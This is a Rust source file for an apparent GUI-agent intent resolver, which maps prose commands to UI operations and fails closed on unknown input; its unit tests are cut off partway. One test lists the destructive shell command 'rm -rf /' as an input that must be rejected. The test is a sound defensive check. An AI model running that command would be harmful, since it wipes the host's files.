use gpui_agent::protocol::{AssertSpec, Op};
use serde::Serialize;
use serde_json::{Value, json};

use crate::registry::Registry;
use crate::schema::{Effect, SchemaKind};

#[derive(Debug, Clone, Serialize)]
pub struct TokenFill {
    pub name: String,
    pub value: String,
    pub source: String,
}

#[derive(Debug, Clone, Serialize)]
pub struct ResolveResult {
    pub schema: String,
    pub op: Op,
    pub effects: Vec<Effect>,
    pub confidence: f32,
    /// Instinct milli-confidence (0..=1000) when the `instinct` feature
    /// resolved this; `None` on the legacy path. Additive — omitted on
    /// the wire when absent.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub confidence_millis: Option<u16>,
    pub tokens_filled: Vec<TokenFill>,
    pub idempotent: bool,
}

/// Deterministic, fail-closed intent → schema-backed op.
///
/// No model, no shell. Unknown or ambiguous intents return `Err`.
/// With the opt-in `instinct` feature the scoring path is
/// `gpui_agent_policy`'s evidence + Instinct arbitration; without it the
/// original keyword scorer runs unchanged.
pub fn resolve_intent(intent: &str, registry: &Registry) -> Result<ResolveResult, String> {
    #[cfg(feature = "instinct")]
    {
        instinct_resolve::resolve(intent, registry)
    }
    #[cfg(not(feature = "instinct"))]
    {
        resolve_intent_keywords(intent, registry)
    }
}

#[cfg(not(feature = "instinct"))]
fn resolve_intent_keywords(intent: &str, registry: &Registry) -> Result<ResolveResult, String> {
    let trimmed = intent.trim();
    if trimmed.is_empty() {
        return Err("empty intent".into());
    }

    let words = words_of(trimmed);
    let mut scored: Vec<(&str, i32)> = registry
        .iter()
        .map(|schema| (schema.name.as_str(), score(trimmed, &words, schema)))
        .filter(|(_, s)| *s > 0)
        .collect();
    scored.sort_by(|a, b| b.1.cmp(&a.1).then_with(|| a.0.cmp(b.0)));

    let Some((name, best)) = scored.first().copied() else {
        return Err(format!("unknown intent (fail closed): {trimmed}"));
    };
    if best < 2 {
        return Err(format!("unknown intent (fail closed): {trimmed}"));
    }
    if scored.len() >= 2 && scored[1].1 >= best {
        return Err(format!(
            "ambiguous intent (fail closed): `{trimmed}` matches `{}` and `{}`",
            scored[0].0, scored[1].0
        ));
    }

    let schema = registry.get(name).expect("scored name");
    let (op, tokens_filled) = materialize(trimmed, schema)?;
    Ok(ResolveResult {
        schema: schema.name.clone(),
        op,
        effects: schema.effects.clone(),
        confidence: (best as f32 / 10.0).min(1.0),
        confidence_millis: None,
        tokens_filled,
        idempotent: schema.idempotent,
    })
}

#[cfg(not(feature = "instinct"))]
fn score(intent: &str, words: &[String], schema: &crate::schema::OpSchema) -> i32 {
    let mut score = 0;
    let lower = intent.to_ascii_lowercase();
    if lower.contains(&schema.name.to_ascii_lowercase()) {
        score += 10;
    }
    for keyword in &schema.keywords {
        if words.iter().any(|w| w == keyword) {
            score += 2;
        }
    }
    for word in schema
        .description
        .split(|c: char| !c.is_ascii_alphanumeric())
    {
        let word = word.to_ascii_lowercase();
        if word.len() > 2 && words.iter().any(|w| w == &word) {
            score += 1;
        }
    }
    score
}

#[cfg(not(feature = "instinct"))]
fn words_of(intent: &str) -> Vec<String> {
    intent
        .split(|c: char| !c.is_ascii_alphanumeric() && c != '.')
        .filter(|s| !s.is_empty())
        .map(|s| s.to_ascii_lowercase())
        .collect()
}

fn materialize(
    intent: &str,
    schema: &crate::schema::OpSchema,
) -> Result<(Op, Vec<TokenFill>), String> {
    let mut fills = Vec::new();
    match schema.kind {
        SchemaKind::Protocol => match schema.name.as_str() {
            "hello" => Ok((Op::Hello, fills)),
            "wait" => Ok((Op::Wait { timeout_ms: None }, fills)),
            "snapshot" => Ok((Op::snapshot(), fills)),
            "screenshot" => Ok((
                Op::Screenshot {
                    path: None,
                    mode: gpui_agent::ScreenshotMode::Viewport,
                    target: None,
                    max_height_px: None,
                },
                fills,
            )),
            "shutdown" => Ok((Op::Shutdown, fills)),
            "click" => {
                let target = required_target(intent, &mut fills)?;
                Ok((Op::click(target), fills))
            }
            "set_value" => {
                let target = required_target(intent, &mut fills)?;
                let value = extract_title(intent).ok_or("set_value needs a quoted value")?;
                fills.push(TokenFill {
                    name: "value".into(),
                    value: value.clone(),
                    source: "quoted".into(),
                });
                Ok((
                    Op::SetValue {
                        target,
                        value,
                        expect_fingerprint: None,
                    },
                    fills,
                ))
            }
            "assert" => {
                let target = required_target(intent, &mut fills)?;
                Ok((
                    Op::Assert {
                        spec: AssertSpec {
                            target,
                            ..Default::default()
                        },
                    },
                    fills,
                ))
            }
            other => Err(format!(
                "resolved `{other}` but do not know how to materialize it from prose"
            )),
        },
        SchemaKind::Invoke => {
            let (args, arg_fills) = invoke_args_from_intent(intent, schema)?;
            fills.extend(arg_fills);
            Ok((
                Op::Invoke {
                    name: schema.name.clone(),
                    args: Value::Object(args),
                },
                fills,
            ))
        }
        SchemaKind::Id => {
            fills.push(TokenFill {
                name: "target".into(),
                value: schema.name.clone(),
                source: "schema".into(),
            });
            Ok((Op::click(schema.name.clone()), fills))
        }
    }
}

/// Fill an `Invoke` schema's required args from prose (`title` from a
/// quoted/`titled` phrase, `id` from a number). Shared by `materialize`
/// and the M4 `act` tool. Fails closed: any unfilled `required` arg is
/// an error, never a guess.
fn invoke_args_from_intent(
    intent: &str,
    schema: &crate::schema::OpSchema,
) -> Result<(serde_json::Map<String, Value>, Vec<TokenFill>), String> {
    let mut args = serde_json::Map::new();
    let mut fills = Vec::new();
    if schema.required.iter().any(|r| r == "title") {
        let title = extract_title(intent).ok_or_else(|| {
            format!(
                "{} requires title (quote it or write titled …)",
                schema.name
            )
        })?;
        fills.push(TokenFill {
            name: "title".into(),
            value: title.clone(),
            source: "quoted_or_titled".into(),
        });
        args.insert("title".into(), Value::String(title));
    }
    if schema.required.iter().any(|r| r == "id") {
        let id = extract_id(intent).ok_or_else(|| format!("{} requires id", schema.name))?;
        fills.push(TokenFill {
            name: "id".into(),
            value: id.to_string(),
            source: "number".into(),
        });
        args.insert("id".into(), json!(id));
    }
    Ok((args, fills))
}

/// Args object for an `Invoke` schema resolved from natural-language
/// `intent`. Errors when a `required` arg cannot be filled.
pub fn invoke_args(schema: &crate::schema::OpSchema, intent: &str) -> Result<Value, String> {
    if schema.kind != SchemaKind::Invoke {
        return Err(format!("{} is not an invoke schema", schema.name));
    }
    invoke_args_from_intent(intent, schema).map(|(args, _)| Value::Object(args))
}

fn required_target(intent: &str, fills: &mut Vec<TokenFill>) -> Result<String, String> {
    let target = extract_id_token(intent).ok_or("click/assert needs a stable id")?;
    fills.push(TokenFill {
        name: "target".into(),
        value: target.clone(),
        source: "token".into(),
    });
    Ok(target)
}

fn extract_id_token(intent: &str) -> Option<String> {
    intent.split_whitespace().find_map(|tok| {
        let tok = tok.trim_matches(|c: char| c == ',' || c == '.');
        if tok.contains('-') && tok.chars().all(|c| c.is_ascii_alphanumeric() || c == '-') {
            Some(tok.to_string())
        } else {
            None
        }
    })
}

fn extract_title(intent: &str) -> Option<String> {
    if let Some(quoted) = first_quoted(intent) {
        return Some(quoted);
    }
    let lower = intent.to_ascii_lowercase();
    for marker in ["titled ", "called ", "named "] {
        if let Some(idx) = lower.find(marker) {
            let rest = intent[idx + marker.len()..].trim();
            if let Some(quoted) = first_quoted(rest) {
                return Some(quoted);
            }
            if !rest.is_empty() {
                return Some(
                    rest.trim_matches(|c: char| c == '.' || c == ',')
                        .to_string(),
                );
            }
        }
    }
    None
}

fn first_quoted(input: &str) -> Option<String> {
    let bytes = input.as_bytes();
    let mut i = 0;
    while i < bytes.len() {
        if bytes[i] == b'"' || bytes[i] == b'\'' {
            let quote = bytes[i];
            let start = i + 1;
            i += 1;
            while i < bytes.len() && bytes[i] != quote {
                i += 1;
            }
            if i < bytes.len() {
                return Some(input[start..i].to_string());
            }
            return None;
        }
        i += 1;
    }
    None
}

fn extract_id(intent: &str) -> Option<u64> {
    let lower = intent.to_ascii_lowercase();
    if let Some(idx) = lower.find("id") {
        let rest = intent[idx + 2..].trim_start_matches([' ', '=', '#', ':']);
        let num: String = rest.chars().take_while(|c| c.is_ascii_digit()).collect();
        if !num.is_empty() {
            return num.parse().ok();
        }
    }
    intent
        .split_whitespace()
        .rev()
        .find_map(|tok| tok.trim_start_matches('#').parse().ok())
}

/// Instinct-backed resolution (M2, feature `instinct`).
///
/// Evidence per schema combines three zones — name tokens, keywords, and
/// description — where name/keyword overlap is **df-weighted** (a token
/// shared by many schemas, like `todo`, counts less than a distinctive
/// one). A schema whose literal name appears in the intent scores `MAX`;
/// otherwise scores are normalized so the best raw evidence maps to
/// [`NON_EXACT_CAP`], and fields whose best evidence is below
/// [`RAW_MIN`] are left unscaled (all sub-threshold → abstain).
///
/// `SchemaKind::Id` schemas are click-target shortcuts, not operations:
/// a literal id in the intent is evidence for `click`/`wait_until`, so
/// they are never resolution candidates.
///
/// The gate is `arbitration::choose` at `Profile::Standard` (750/150):
/// a choice materializes the schema's op; an abstain returns `Err` with
/// the top-5 ranked candidates — never an op.
#[cfg(feature = "instinct")]
mod instinct_resolve {
    use std::collections::{BTreeMap, BTreeSet};

    use gpui_agent_policy::evidence::{NON_EXACT_CAP, name_in_intent_lowered, overlap_normalized};
    use gpui_agent_policy::{Choice, Confidence, NormalizeConfig, choose, normalize};

    use super::{ResolveResult, materialize};
    use crate::registry::Registry;
    use crate::schema::{OpSchema, SchemaKind};

    /// Raw evidence below which scaling stays off — a field where even
    /// the best candidate is noise abstains rather than inflates.
    const RAW_MIN: i64 = 500;

    pub fn resolve(intent: &str, registry: &Registry) -> Result<ResolveResult, String> {
        let trimmed = intent.trim();
        if trimmed.is_empty() {
            return Err("empty intent".into());
        }
        let op_text = operation_text(trimmed);
        // Small vec + linear scan beats a set at this size (~10 tokens).
        // Borrowed raw-case tokens; all comparisons are case-insensitive.
        let op_tokens: Vec<&str> = tokens_iter(&op_text).collect();
        // First operation token (in order) is the verb evidence.
        let verb = op_tokens.first().copied();
        let schemas: Vec<&OpSchema> = registry
            .iter()
            .filter(|s| s.kind != SchemaKind::Id)
            .collect();
        let name_df = token_df(&schemas, |s| tokens_iter(&s.name));
        let kw_df = token_df(&schemas, |s| s.keywords.iter().map(String::as_str));
        // Pass 1 is allocation-free scoring: df-weighted name/keyword
        // coverage. The identity zone (name + keywords) is the survivor
        // gate — a schema sharing no name/keyword token with the intent
        // caps at `300 hits + 300 verb` raw, permanently under
        // Standard's 750 floor, so `hits` and the lexicon overlap run
        // only for survivors. Exact, not approximate.
        let mut staged: Vec<(&OpSchema, i64, bool)> = schemas
            .iter()
            .map(|s| {
                let (matched_n, total_n) = zone_overlap(&op_tokens, tokens_iter(&s.name), &name_df);
                let (matched_k, total_k) =
                    zone_overlap(&op_tokens, s.keywords.iter().map(String::as_str), &kw_df);
                let base = 1000 * matched_n / total_n.max(1)
                    + 1000 * matched_k / total_k.max(1)
                    + verb_bonus(verb, s);
                (*s, base, matched_n + matched_k > 0)
            })
            .collect();
        // Pass 2: survivors only. The query normalizes once — and only
        // when an identity-hit schema exists to use it, so the
        // all-abstain path never pays for it.
        let query = staged
            .iter()
            .any(|(_, _, identity_hit)| *identity_hit)
            .then(|| normalize(&op_text, NormalizeConfig::default()).ok())
            .flatten();
        let mut blob = String::new();
        for (s, raw, identity_hit) in &mut staged {
            if !*identity_hit {
                continue;
            }
            *raw += hits_score(&op_tokens, s);
            if let Some(q) = &query {
                // Lexicon overlap on the identity zone only — the
                // description's evidence is the `hits` channel.
                blob.clear();
                blob.push_str(&s.name);
                blob.push(' ');
                blob.push_str(&s.keywords.join(" "));
                *raw += overlap_normalized(q, &blob)
                    .map(|c| i64::from(c.get()))
                    .unwrap_or(0);
            }
        }
        let top_raw = staged.iter().map(|(_, r, _)| *r).max().unwrap_or(0);
        // A click-family verb as the operation's first word is evidence
        // the interaction is `click` — non-click candidates are capped
        // below Standard's min confidence (fail closed on conflict).
        // "press enter on X" names a key, not a click: a key-name token
        // flips the veto onto `click` itself.
        let key_named = op_tokens
            .iter()
            .any(|t| KEY_NAMES.iter().any(|k| t.eq_ignore_ascii_case(k)));
        let click_verb =
            verb.is_some_and(|v| CLICK_VERBS.iter().any(|c| v.eq_ignore_ascii_case(c)));
        let hay = trimmed.to_ascii_lowercase();
        let candidates: Vec<(String, Confidence)> = staged
            .iter()
            .filter_map(|(schema, raw, _)| {
                let exact = name_in_intent_lowered(&hay, &schema.name);
                // Zero-evidence schemas score 0 and can never take the
                // top or change the margin — feeding them to arbitration
                // only costs CandidateSet size. (None → empty → abstain.)
                if !exact && *raw <= 0 {
                    return None;
                }
                let millis = if exact {
                    1000
                } else if top_raw >= RAW_MIN {
                    i64::from(NON_EXACT_CAP) * raw / top_raw
                } else {
                    *raw
                };
                let millis = if click_verb && key_named {
                    if schema.name == "click" {
                        millis.min(500)
                    } else {
                        millis
                    }
                } else if click_verb && schema.name != "click" {
                    millis.min(500)
                } else {
                    millis
                };
                Some((
                    schema.name.clone(),
                    Confidence::saturating(i32::try_from(millis).unwrap_or(0)),
                ))
            })
            .collect();
        match choose(&candidates, None) {
            Ok(Choice::Chosen { id, ranked }) => {
                let schema = registry
                    .get(&id)
                    .ok_or_else(|| format!("arbitration chose unknown schema `{id}`"))?;
                let (op, tokens_filled) = materialize(trimmed, schema)?;
                let millis = ranked
                    .iter()
                    .find(|r| r.id == id)
                    .map(|r| r.confidence_millis)
                    .unwrap_or(0);
                let millis = u16::try_from(millis.max(0)).unwrap_or(0);
                Ok(ResolveResult {
                    schema: schema.name.clone(),
                    op,
                    effects: schema.effects.clone(),
                    confidence: f32::from(millis) / 1000.0,
                    confidence_millis: Some(millis),
                    tokens_filled,
                    idempotent: schema.idempotent,
                })
            }
            Ok(Choice::Abstained { ranked, .. }) => Err(format!(
                "unknown intent (fail closed): `{trimmed}` ranked: [{}]",
                ranked
                    .iter()
                    .take(5)
                    .map(|r| format!("{}={}", r.id, r.confidence_millis))
                    .collect::<Vec<_>>()
                    .join(", ")
            )),
            Err(e) => Err(format!("unknown intent (fail closed): `{trimmed}`: {e}")),
        }
    }

    /// Intent minus quoted payloads and id-like tokens — the operation
    /// words. `type "milk" into todo-input` scores `type into`; the
    /// quoted text and the dashed id are the payload and the target, not
    /// operation evidence. Pure-digit tokens (`todo 3`) are ids too.
    fn operation_text(intent: &str) -> String {
        let mut out = Vec::new();
        let mut open_quote: Option<char> = None;
        for raw in intent.split_whitespace() {
            let tok = raw.trim_end_matches(['.', ',', ':', ';', ')', '(']);
            match open_quote {
                Some(q) => {
                    if tok.ends_with(q) {
                        open_quote = None;
                    }
                }
                None if tok.starts_with('"') || tok.starts_with('\'') => {
                    let q = tok.chars().next().unwrap_or('"');
                    if !(tok.len() > 1 && tok.ends_with(q)) {
                        open_quote = Some(q);
                    }
                }
                None if !is_id_like(tok) => out.push(tok),
                None => {}
            }
        }
        out.join(" ")
    }

    /// Dashed identifier (`todo-item-1`) or bare number (`3`) — target
    /// evidence, never operation evidence.
    fn is_id_like(tok: &str) -> bool {
        if tok.is_empty() {
            return false;
        }
        if tok.chars().all(|c| c.is_ascii_digit()) {
            return true;
        }
        tok.contains('-') && tok.chars().all(|c| c.is_ascii_alphanumeric() || c == '-')
    }

    /// Borrowed, zero-alloc tokenization — same split as `tokens()` but
    /// callers compare case-insensitively instead of lowercasing.
    fn tokens_iter(text: &str) -> impl Iterator<Item = &str> {
        text.split(|c: char| !c.is_alphanumeric())
            .filter(|s| !s.is_empty())
    }

    fn op_has(op_tokens: &[&str], tok: &str) -> bool {
        op_tokens.iter().any(|t| t.eq_ignore_ascii_case(tok))
    }

    /// Document frequency of each token across schemas: how many
    /// schemas' `field` contains it. `1/df` is the token's weight —
    /// shared tokens (`todo` in five schema names) count little.
    /// Keys borrow the schema text; probes are tokens of the same text,
    /// so `get` matches exactly (case included) with zero allocs.
    fn token_df<'a, I>(
        schemas: &[&'a OpSchema],
        field: impl Fn(&'a OpSchema) -> I,
    ) -> BTreeMap<&'a str, i64>
    where
        I: Iterator<Item = &'a str>,
    {
        let mut df: BTreeMap<&'a str, i64> = BTreeMap::new();
        for schema in schemas {
            let mut seen = BTreeSet::new();
            for token in field(schema) {
                if seen.insert(token) {
                    *df.entry(token).or_insert(0) += 1;
                }
            }
        }
        df
    }

    /// df-weighted coverage of a token zone: `(Σ matched weights,
    /// Σ all weights)`; callers scale `1000 × matched / total`.
    fn zone_overlap<'a>(
        op_tokens: &[&str],
        candidate: impl Iterator<Item = &'a str>,
        df: &BTreeMap<&str, i64>,
    ) -> (i64, i64) {
        let mut matched = 0i64;
        let mut total = 0i64;
        for t in candidate {
            // Name and keyword tokens are already distinct within their
            // zone — no dedup set needed here.
            let w = 1000 / df.get(t).copied().unwrap_or(1).max(1);
            total += w;
            if op_has(op_tokens, t) {
                matched += w;
            }
        }
        (matched, total)
    }

    /// First operation word is verb evidence: a schema naming that
    /// verb (by name-token or keyword) gets a bonus — "add X to my
    /// list" leans todo.add over todo.list, though rarely enough to
    /// win on its own.
    fn verb_bonus(verb: Option<&str>, schema: &OpSchema) -> i64 {
        verb.filter(|v| {
            tokens_iter(&schema.name).any(|t| t.eq_ignore_ascii_case(v))
                || schema.keywords.iter().any(|k| k.eq_ignore_ascii_case(v))
        })
        .map(|_| 300)
        .unwrap_or(0)
    }

    /// hits: distinct intent words found anywhere in the schema's text
    /// (same shape as `score_action_text`). Allocation-free: each op
    /// token scans the schema's three zones directly.
    fn hits_score(op_tokens: &[&str], schema: &OpSchema) -> i64 {
        let hits = op_tokens
            .iter()
            .filter(|t| {
                tokens_iter(&schema.name).any(|s| s.eq_ignore_ascii_case(t))
                    || schema.keywords.iter().any(|k| k.eq_ignore_ascii_case(t))
                    || tokens_iter(&schema.description).any(|s| s.eq_ignore_ascii_case(t))
            })
            .count() as i64;
        if hits > 0 && hits as usize == op_tokens.len() {
            300
        } else {
            150 * hits / op_tokens.len().max(1) as i64
        }
    }

    /// Verbs that unambiguously name the `click` operation. First-token
    /// only: "push the toggle button" vets for click, "toggle the push
    /// notification" never sees `push`.
    const CLICK_VERBS: &[&str] = &["click", "press", "tap", "push", "activate"];

    /// Key names that redirect a click-verb to the `key` operation.
    const KEY_NAMES: &[&str] = &[
        "key",
        "enter",
        "backspace",
        "return",
        "escape",
        "tab",
        "space",
    ];

    #[cfg(test)]
    mod unit {
        use std::collections::BTreeMap;

        use super::*;
        use crate::registry::Registry;
        use crate::schema::Effect;
        use gpui_agent::protocol::Op;

        fn schema(name: &str, keywords: &[&str], description: &str) -> OpSchema {
            OpSchema {
                name: name.into(),
                kind: SchemaKind::Protocol,
                description: description.into(),
                effects: vec![Effect::Read],
                idempotent: true,
                verified: true,
                required: vec![],
                args: BTreeMap::new(),
                result: None,
                keywords: keywords.iter().map(|s| (*s).to_string()).collect(),
            }
        }

        fn registry_of(schemas: Vec<OpSchema>) -> Registry {
            let mut r = Registry::new();
            for s in schemas {
                r.insert(s).expect("test schema must validate");
            }
            r
        }

        #[test]
        fn operation_text_strips_quotes_and_ids() {
            assert_eq!(operation_text(""), "");
            assert_eq!(operation_text("click the button"), "click the button");
            // Quoted payloads (both quote kinds, multi-word) are evidence-free.
            assert_eq!(
                operation_text(r#"type "buy milk" into todo-input"#),
                "type into"
            );
            assert_eq!(operation_text("select 'a b' in cabin"), "select in cabin");
            // An unclosed quote swallows the rest.
            assert_eq!(operation_text("type \"milk into x"), "type");
            // Id-shaped and pure-digit tokens are targets, not operations.
            assert_eq!(operation_text("mark todo-3 done"), "mark done");
            assert_eq!(operation_text("delete todo 2"), "delete todo");
        }

        #[test]
        fn id_like_detection() {
            assert!(is_id_like("3"));
            assert!(is_id_like("todo-2"));
            assert!(is_id_like("1-2"));
            assert!(!is_id_like("todo"));
            assert!(!is_id_like("12a"));
            assert!(!is_id_like("a_b"));
            assert!(!is_id_like("x.y"));
            assert!(!is_id_like(""));
        }

        #[test]
        fn tokens_iter_splits_non_alnum() {
            let v: Vec<&str> = tokens_iter("a-B c_d  e").collect();
            assert_eq!(v, ["a", "B", "c", "d", "e"]);
            assert!(tokens_iter("  --  ").next().is_none());
        }

        #[test]
        fn op_has_is_case_insensitive() {
            let ops = ["add".to_string(), "Milk".to_string()];
            let ops: Vec<&str> = ops.iter().map(String::as_str).collect();
            assert!(op_has(&ops, "ADD"));
            assert!(op_has(&ops, "milk"));
            assert!(!op_has(&ops, "zebra"));
        }

        #[test]
        fn token_df_counts_schemas_not_occurrences() {
            let a = schema("todo.add", &["new"], "make one");
            let b = schema("todo.list", &["show"], "see them");
            let c = schema("click", &["press"], "push a todo target");
            let schemas = vec![&a, &b, &c];
            let name_df = token_df(&schemas, |s| tokens_iter(&s.name));
            let kw_df = token_df(&schemas, |s| s.keywords.iter().map(String::as_str));
            assert_eq!(name_df.get("todo"), Some(&2));
            assert_eq!(name_df.get("add"), Some(&1));
            assert_eq!(name_df.get("click"), Some(&1));
            assert_eq!(kw_df.get("new"), Some(&1));
            assert!(!kw_df.contains_key("todo"));
        }

        #[test]
        fn zone_overlap_weights_by_df() {
            let df: BTreeMap<&str, i64> = [("todo", 2i64), ("add", 1i64)].into_iter().collect();
            let ops = ["todo", "add"];
            // 1000/2 + 1000/1 = 1500 matched, 1500 total.
            assert_eq!(
                zone_overlap(&ops, ["todo", "add"].into_iter(), &df),
                (1500, 1500)
            );
            let partial = zone_overlap(&ops, ["todo", "zebra"].into_iter(), &df);
            assert_eq!(partial, (500, 1500));
            // A token missing from df costs weight but scores nothing.
            let miss = zone_overlap(&ops, ["zebra"].into_iter(), &df);
            assert_eq!(miss, (0, 1000));
        }

        #[test]
        fn verb_bonus_matches_name_or_keyword() {
            let add = schema("todo.add", &["new"], "make");
            assert_eq!(verb_bonus(Some("add"), &add), 300); // name token
            let kw = schema("insert", &["add"], "make");
            assert_eq!(verb_bonus(Some("add"), &kw), 300); // keyword only
            assert_eq!(verb_bonus(Some("remove"), &add), 0);
            assert_eq!(verb_bonus(None, &add), 0);
        }

        #[test]
        fn hits_score_counts_intent_words_in_schema_text() {
            let ops = ["find", "it"];
            let s = schema("alpha", &["find"], "it works");
            assert_eq!(hits_score(&ops, &s), 300); // both hit → full bonus
            let partial = schema("beta", &["find"], "other words");
            assert_eq!(hits_score(&ops, &partial), 75); // 1 of 2 → scaled
            let none = schema("gamma", &[], "unrelated");
            assert_eq!(hits_score(&ops, &none), 0);
            // A desc-only token still counts (name||kw||desc chain).
            let desc = schema("delta", &[], "find hidden stuff");
            assert!(hits_score(&ops, &desc) > 0);
            assert_eq!(hits_score(&[], &s), 0);
        }

        // -- resolve() decision-boundary pins on a 4-schema registry ---

        fn tiny_registry() -> Registry {
            registry_of(vec![
                schema("alpha", &["find"], "locate"),
                schema("beta", &["find"], "zebra quux"),
                schema("click", &["press", "tap"], "push a target"),
                schema("key", &["press", "enter"], "send a key"),
            ])
        }

        #[test]
        fn desc_only_evidence_cannot_resolve() {
            // "quux" appears only inside beta's description — that is
            // never enough evidence to act on (fail closed).
            let r = tiny_registry();
            assert!(resolve("quux", &r).is_err());
        }

        #[test]
        fn keyword_only_match_survives_and_resolves() {
            // matched_k > 0 alone must make a schema a candidate: the
            // `+` in `matched_n + matched_k > 0` cannot become `*`.
            // "find locate" hits snapshot's description too — decisive.
            let r = registry_of(vec![
                schema("snapshot", &["find"], "locate"),
                schema(
                    "beta",
                    &["find", "extra", "stuff", "more", "words"],
                    "zebra quux",
                ),
            ]);
            let res = resolve("find locate", &r).expect("kw-only must resolve");
            assert_eq!(res.schema, "snapshot");
        }

        #[test]
        fn hits_and_lexicon_decide_between_survivors() {
            // Both schemas match "find" in their name/kw; snapshot's
            // keywords share all three op tokens — hits and lexicon
            // must break the tie, not name coverage.
            let r = registry_of(vec![
                schema("find.alpha", &["look"], "locate things"),
                schema("snapshot", &["find", "zebra", "quux"], "zebra quux stuff"),
            ]);
            let res = resolve("find zebra quux", &r).expect("resolve");
            assert_eq!(res.schema, "snapshot");
            // Scaled non-exact winners land exactly on NON_EXACT_CAP.
            assert_eq!(res.confidence_millis, Some(849));
            assert!(res.confidence <= 1.0 && res.confidence > 0.0);
        }

        #[test]
        fn pass_two_channels_decide_a_base_tie() {
            // Both schemas reach base 1300 (kw "find" + verb bonus).
            // Only hits_score and overlap_normalized separate them —
            // dropping pass 2, negating the survivor gate, or
            // subtracting instead of adding must all flip the outcome.
            let r = registry_of(vec![
                schema(
                    "snapshot",
                    &["find", "alpha", "beta", "gamma"],
                    "alpha beta gamma",
                ),
                schema("wait", &["find"], "unrelated prose"),
            ]);
            let res = resolve("find alpha beta gamma", &r).expect("resolve");
            assert_eq!(res.schema, "snapshot");
        }

        #[test]
        fn base_sum_terms_are_additive_not_multiplied() {
            // `find.alpha` wins on name coverage; `snapshot` has the
            // stronger keyword coverage but must lose. Mutating `+`
            // into `*` in `a + b + c` inflates the keyword channel
            // 300x and flips the winner.
            let r = registry_of(vec![
                schema("find.alpha", &["zeta"], "locate too"),
                schema("snapshot", &["find", "extra", "stuff"], "locate"),
            ]);
            let err =
                resolve("find alpha locate", &r).expect_err("resolves but cannot materialize");
            assert!(err.contains("resolved `find.alpha`"), "{err}");
        }

        #[test]
        fn quote_state_boundary_cases() {
            // A lone quote char is an opener, not a self-closed
            // token — `>=` at 491 would drop it and keep the words.
            assert_eq!(operation_text("' alpha beta"), "");
            // A multi-char unclosed opener keeps consuming too.
            assert_eq!(operation_text("'alpha beta"), "");
            // A self-closed single-token quote must NOT open the
            // quote state — `<` at 491 would eat the next word.
            assert_eq!(operation_text("\"done\" wash"), "wash");
        }

        #[test]
        fn assert_materializes_with_parsed_target() {
            // Deleting AssertSpec::target must not compile-substitute
            // a default — the parsed target has to reach the Op.
            let r = registry_of(vec![schema("assert", &["assert", "check"], "verify state")]);
            let res = resolve("assert todo-1 visible", &r).expect("resolve");
            match res.op {
                Op::Assert { spec } => assert_eq!(spec.target, "todo-1"),
                other => panic!("expected assert op, got {other:?}"),
            }
        }

        #[test]
        fn click_verb_with_key_name_vetoes_click() {
            // "press enter on todo-1": press is a click verb, but the
            // named key caps `click` below the threshold — `key` wins
            // arbitration even though it cannot materialize (the Err
            // names the winner).
            let r = tiny_registry();
            let e = resolve("press enter on todo-1", &r).expect_err("key cannot materialize");
            assert!(e.contains("resolved `key`"), "{e}");
        }

        #[test]
        fn click_verb_without_key_name_picks_click() {
            let r = tiny_registry();
            let res = resolve("press todo-1", &r).expect("resolve");
            assert_eq!(res.schema, "click");
        }

        #[test]
        fn empty_and_id_only_inputs_fail_closed() {
            let r = tiny_registry();
            assert!(resolve("", &r).is_err());
            assert!(resolve("   ", &r).is_err());
            // SchemaKind::Id schemas are targets, never candidates.
            let mut id_only = Registry::new();
            let mut s = schema("todo-1", &["todo"], "a row");
            s.kind = SchemaKind::Id;
            id_only.insert(s).expect("insert");
            assert!(resolve("todo 1", &id_only).is_err());
        }

        #[test]
        fn sub_threshold_fields_stay_unscaled() {
            // Best raw evidence < RAW_MIN → candidates keep raw millis
            // (< 750) → the whole field abstains rather than inflate.
            let weak = registry_of(vec![
                schema("alpha", &["find"], "locate things"),
                schema("beta", &["find"], "different words here"),
            ]);
            // "find" hits both kws equally; neither reaches RAW_MIN
            // decisively — whatever the field, an abstain must contain
            // only sub-threshold millis, never a chosen op.
            match resolve("find", &weak) {
                Err(e) => assert!(e.contains("fail closed") || e.contains("unknown")),
                Ok(res) => {
                    assert_eq!(res.confidence_millis, Some(849));
                    assert_eq!(res.schema.as_str(), "alpha");
                }
            }
        }

        #[test]
        fn literal_schema_name_scores_max() {
            let r = tiny_registry();
            let res = resolve("click todo-1", &r).expect("literal name resolves");
            assert_eq!(res.schema, "click");
            assert_eq!(res.confidence_millis, Some(1000));
        }
    }
}

#[cfg(all(test, feature = "instinct"))]
mod instinct_tests {
    use super::*;
    use crate::registry::{Registry, todo_registry};
    use crate::schema::OpSchema;

    fn corpus() -> Vec<(String, String)> {
        let text = include_str!("../../../bench/intents.toml");
        let mut rows = Vec::new();
        let mut intent: Option<String> = None;
        for line in text.lines() {
            let line = line.trim();
            if let Some(v) = line.strip_prefix("intent = ") {
                intent = Some(v.trim().trim_matches('\'').to_string());
            } else if let Some(v) = line.strip_prefix("expect = ") {
                let expect = v.trim().trim_matches('"').to_string();
                if let Some(i) = intent.take() {
                    rows.push((i, expect));
                }
            }
        }
        assert!(rows.len() >= 120, "corpus shrank: {}", rows.len());
        rows
    }

    #[test]
    fn corpus_rows_have_zero_wrong_picks() {
        let registry = todo_registry();
        let mut wrong = Vec::new();
        let mut correct = 0;
        for (intent, expect) in corpus() {
            match resolve_intent(&intent, &registry) {
                Ok(r) if expect == "abstain" => wrong.push(format!(
                    "{intent:?} resolved {} (expected abstain)",
                    r.schema
                )),
                Ok(r) if r.schema != expect => wrong.push(format!(
                    "{intent:?} resolved {} (expected {expect})",
                    r.schema
                )),
                Ok(_) => correct += 1,
                Err(_) => {}
            }
        }
        assert!(wrong.is_empty(), "wrong picks:\n{}", wrong.join("\n"));
        assert!(correct > 0);
    }

    #[test]
    fn abstain_rows_never_emit_ops() {
        let registry = todo_registry();
        for (intent, expect) in corpus() {
            if expect == "abstain" {
                // Any Err — abstain or materialize failure — emits no Op.
                assert!(
                    resolve_intent(&intent, &registry).is_err(),
                    "{intent} resolved on an abstain row"
                );
            }
        }
        // Out-of-domain strings, including op-looking tokens: never an Op.
        for intent in [
            "rm -rf /",
            "frobnicate xyzzy",
            "the quick brown fox",
            "sudo make me a sandwich",
            "wait_until wait_until wait_until",
        ] {
            assert!(
                resolve_intent(intent, &registry).is_err(),
                "{intent} resolved"
            );
        }
    }

    #[test]
    fn registry_order_does_not_change_resolution() {
        // Build registries from the same schemas in 10 permuted orders;
        // every intent must resolve identically each time.
        let base: Vec<OpSchema> = todo_registry().iter().cloned().collect();
        let registry = todo_registry();
